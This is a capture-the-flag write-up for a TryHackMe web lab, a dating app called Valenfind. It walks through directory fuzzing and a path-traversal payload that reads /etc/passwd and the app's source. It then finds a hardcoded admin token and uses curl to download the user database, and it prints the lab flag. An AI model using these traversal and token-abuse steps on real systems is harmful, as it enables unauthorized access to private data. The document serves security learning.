# TryHackMe: Valenfind

- **Machine Name:** Valenfind
- **Difficulty:** Medium
- **Category**: Web
- **Description:** Can you find vulnerabilities in this new dating app?
-----

## 1. Reconnaissance

After connecting to the TryHackMe VPN, we access the provided IP address on port 5000. We are greeted by a landing page for a dating app.

Let's start by enumerating directories to find hidden pages using **ffuf**:

```bash
╭─░▒▓    /home/raine  
╰─ ffuf -u http://10.81.144.91:5000/FUZZ -w /usr/share/wordlists/dirb/big.txt 
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://10.81.144.91:5000/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________  
  
dashboard         [Status: 302, Size: 199, Words: 18, Lines: 6]  
login             [Status: 200, Size: 2682, Words: 531, Lines: 51]  
logout            [Status: 302, Size: 189, Words: 18, Lines: 6]  
my_profile        [Status: 302, Size: 199, Words: 18, Lines: 6]  
register          [Status: 200, Size: 2694, Words: 532, Lines: 51]

```

Nothing unusual here: standard login, register, and profile pages. Let's register an account to look inside the application.

Simultaneously, we check the site technologies using the **Wappalyzer** extension.

<img width="478" height="373" alt="Screenshot_20260215_095140" src="https://github.com/user-attachments/assets/97c3787a-b247-4e0f-aab6-a1fb6ee0cc87" />


**Important Finding:** The site runs on the **Python Flask** framework. This is key information that will help us predict the file structure on the server.

---

## 2. Finding the Vulnerability (LFI)

While exploring the features available to logged-in users, we discover an option to change the profile theme.

Intercepting the request in **Burp Suite**, we see an interesting `layout` parameter in the GET request:

<img width="760" height="372" alt="Screenshot_20260215_095043" src="https://github.com/user-attachments/assets/2a2d2fd8-74d4-4437-bf54-2d8efcf6d65f" />

The `layout` parameter loads an HTML file. This is a classic vector for checking for **LFI (Local File Inclusion)** vulnerabilities — the ability to read local server files.

Let's try to break out of the current directory using `../` and read the `/etc/passwd` file:

**Payload:**

```
../../../../../../etc/passwd
```

<img width="1459" height="765" alt="Screenshot_20260215_095211" src="https://github.com/user-attachments/assets/0a477bdd-0c9a-499b-9842-fbe9d50fcacd" />

**Result:** The server returned the content of `/etc/passwd`. Vulnerability confirmed!

---

## 3. Source Code Analysis

Since we know the site is built with **Flask**, let's attempt to retrieve the application's source code (usually `app.py`). However, we don't know the exact path to the site folder.

**Linux Trick:** We can use the path `/proc/self/cwd/`, which always refers to the **c**urrent **w**orking **d**irectory of the running process.

**Request:**

```
/api/fetch_layout?layout=../../../../proc/self/cwd/app.py
```

The server returned the `app.py` source code. Let's analyze it.
[Source Code here](app.py)


### Interesting Findings:

1. **Secret Admin Key:** At the beginning of the file, we find a hardcoded token:
    
    ```python
    ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
    ```
    
1. **Hidden API Endpoint:** The code contains an `export_db` function that allows downloading the database if the correct token is passed in the request header.
    
    ```python
    @app.route('/api/admin/export_db')
    def export_db():
        auth_header = request.headers.get('X-Valentine-Token')
    
        if auth_header == ADMIN_API_KEY:
            # Sends the database file
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        else:
            return jsonify({"error": "Forbidden"}), 403
    ```
    

---

## 4. Exploitation and Flag

Now we have everything we need:

- **Endpoint:** `/api/admin/export_db`
    
- **Header:** `X-Valentine-Token`
    
- **Token Value:** `CUPID_MASTER_KEY_2024_XOXO`
    

We use `curl` to download the database:

Bash

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://10.81.144.91:5000/api/admin/export_db \
     -o valenfind_leak.db
```

### Database Analysis

The downloaded file is an **SQLite** database (evident from the code: `import sqlite3`). Let's open it:
Bash

```bash
sqlite3 valenfind_leak.db
```

Let's look at the tables and content:

SQL

```sql
sqlite> .tables
users
sqlite> select * from users;
```

Among the users, we find the administrator (Cupid). In the "phone_number" or "bio" field (depending on the columns), we see our flag:

```
8|cupid|...|FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}|...
```

**Flag:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

---

**Summary:** We leveraged an LFI vulnerability to retrieve the source code, found a hardcoded admin token, and dumped the user database. Machine pwned!
